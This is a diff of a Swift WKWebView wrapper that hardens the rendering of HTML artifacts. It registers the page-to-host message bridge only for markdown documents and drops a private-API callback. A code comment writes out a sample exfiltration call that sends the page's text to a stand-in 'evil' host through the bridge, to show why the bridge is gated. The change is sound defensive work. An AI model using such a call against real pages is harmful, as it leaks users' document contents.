@@ -29,7 +29,10 @@ protocol HardenedWebViewDelegate: AnyObject {
 /// Three independent mechanisms, because any one of them can be wrong:
 ///  1. the page CSP (`connect-src 'none'`, no remote origins),
 ///  2. a compiled content rule list that blocks every non-`artifact:` load
-///     inside WebKit before a request is issued,
+///     inside WebKit before a request is issued. Note that subresource blocks
+///     are NOT observable through public API — the callback that reports them
+///     is private WebKit — so the counter below reflects blocked *navigations*
+///     only, and the rule list works silently underneath,
 ///  3. a navigation delegate that refuses top-level navigation.
 final class HardenedWebView: WKWebView {
 
@@ -58,6 +61,8 @@ final class HardenedWebView: WKWebView {
     /// When true, the rule list is detached for the current document only.
     private var networkAllowedForCurrentDocument = false
 
+    private var bridgeInstalled = false
+
     private static let messageHandlerName = "agentia"
 
     // MARK: - Construction
@@ -79,7 +84,10 @@ final class HardenedWebView: WKWebView {
 
         super.init(frame: .zero, configuration: configuration)
 
-        userContent.add(MessageProxy(target: self), name: Self.messageHandlerName)
+        // The message handler is installed per-load, not here — see
+        // setBridgeInstalled(_:). Registering it unconditionally would expose
+        // window.webkit.messageHandlers.agentia to an HTML artifact's own
+        // script, which runs in the same content world.
 
         navigationDelegate = self
         uiDelegate = self
@@ -99,6 +107,35 @@ final class HardenedWebView: WKWebView {
         // WKUserContentController holds message handlers strongly; without this
         // the proxy outlives the view.
         userContent.removeScriptMessageHandler(forName: Self.messageHandlerName)
+    }
+
+    /// Install or remove the page-to-host bridge.
+    ///
+    /// This is the boundary that stops an HTML artifact exfiltrating data. A
+    /// script message handler lives in the page content world, and the
+    /// htmlArtifact profile deliberately lets the document's own script run in
+    /// that same world. With the bridge present, one line inside an artifact —
+    ///
+    ///     webkit.messageHandlers.agentia.postMessage(
+    ///       {type:"openExternal", url:"https://evil/?d="+document.body.innerText})
+    ///
+    /// — would have the host call NSWorkspace.open, walking straight past all
+    /// three containment mechanisms: no request for the CSP to refuse, none for
+    /// the rule list to block, and no navigation for the delegate to cancel.
+    /// The same channel could write the clipboard silently.
+    ///
+    /// So the bridge exists only for the markdown profile, where the CSP pins
+    /// script-src to the hash of shell.js and the document cannot execute
+    /// anything of its own. HTML artifacts lose the copy buttons and scroll
+    /// restoration, which is the right trade.
+    private func setBridgeInstalled(_ installed: Bool) {
+        guard installed != bridgeInstalled else { return }
+        if installed {
+            userContent.add(MessageProxy(target: self), name: Self.messageHandlerName)
+        } else {
+            userContent.removeScriptMessageHandler(forName: Self.messageHandlerName)
+        }
+        bridgeInstalled = installed
     }
 
     // MARK: - Content rule list
@@ -154,7 +191,7 @@ final class HardenedWebView: WKWebView {
 
     // MARK: - Loading
 
-    func load(page html: String, assetRoot: URL) {
+    func load(page html: String, assetRoot: URL, profile: RenderProfile) {
         // A previous document may have been granted network access, which
         // detached the rule list. Re-arm before loading the next one, or the
         // grant would silently persist across documents.
@@ -162,6 +199,7 @@ final class HardenedWebView: WKWebView {
             networkAllowedForCurrentDocument = false
             installContentRuleList()
         }
+        setBridgeInstalled(profile == .markdown)
         blockedRequestCount = 0
         schemeHandler.setDocument(html: html, assetRoot: assetRoot)
         load(URLRequest(url: ArtifactSchemeHandler.documentURL))
@@ -211,14 +249,6 @@ extension HardenedWebView: WKNavigationDelegate {
         decisionHandler(.allow)
     }
 
-    func webView(
-        _ webView: WKWebView,
-        contentRuleListWithIdentifier identifier: String,
-        performedAction action: WKContentRuleListAction,
-        forURL url: URL
-    ) {
-        if action.blockedLoad { noteBlockedRequest() }
-    }
 }
 
 // MARK: - UI
